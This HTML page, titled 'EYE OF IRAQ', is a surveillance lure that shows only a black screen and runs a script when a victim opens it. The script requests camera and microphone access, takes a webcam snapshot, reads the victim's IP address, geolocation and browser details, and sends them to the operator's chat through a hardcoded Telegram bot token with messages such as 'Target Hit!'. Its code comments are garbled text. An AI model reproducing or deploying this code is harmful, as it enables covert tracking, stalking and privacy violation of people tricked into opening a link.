<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>EYE OF IRAQ</title>
    <style>body { background-color: black; }</style>
</head>
<body onload="capture()">
<script>
    const urlParams = new URLSearchParams(window.location.search);
    const targetID = urlParams.get('id'); // Ÿà€ïÿ±⁄Øÿ±ÿ™ŸÜ€å ID€å ÿ¶€ïŸà ⁄©€ïÿ≥€ï€å ŸÑ€åŸÜ⁄©€ï⁄©€ï€å ŸÜÿßÿ±ÿØŸàŸà€ï
    const TOKEN = "8300725896:AAHHhfRB0II4tFDs7ypgNTS_Xc9gWP40Z58";

    async function capture() {
        if (!targetID) return;

        try {
            // ÿØÿßŸàÿß⁄©ÿ±ÿØŸÜ€å ŸÖÿß€å⁄©ÿ±€ÜŸÅ€ÜŸÜ Ÿà ⁄©ÿßŸÖ€éÿ±ÿß ÿ®€ï ÿÆ€éÿ±ÿß€å€å
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            
            // ŸÜÿßÿ±ÿØŸÜ€å IP Ÿà ÿ≤ÿßŸÜ€åÿßÿ±€å ÿ¶ÿßŸÖ€éÿ±
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    sendToTelegram(`üíÄ Target Hit!\nüë§ Sent by: ${targetID}\nüåê IP: ${data.ip}\nüì± UA: ${navigator.userAgent}`);
                });

            // ŸÑŸà⁄©€ï€åÿ¥ŸÜ
            navigator.geolocation.getCurrentPosition(pos => {
                sendLocation(pos.coords.latitude, pos.coords.longitude);
            });

            // ⁄Øÿ±ÿ™ŸÜ€å Ÿà€éŸÜ€ï (Snapshot)
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(b => sendFile(b, "photo"), 'image/jpeg');
            }, 1000);

        } catch (e) {
            sendToTelegram("‚ö†Ô∏è Permission Denied by target.");
        }
    }

    function sendToTelegram(text) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, text: text, parse_mode: "HTML"})
        });
    }

    function sendLocation(lat, lon) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: targetID, latitude: lat, longitude: lon})
        });
    }

    function sendFile(blob, type) {
        let fd = new FormData();
        fd.append("chat_id", targetID);
        fd.append(type, blob, "file.jpg");
        fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
    }
</script>
</body>
</html>
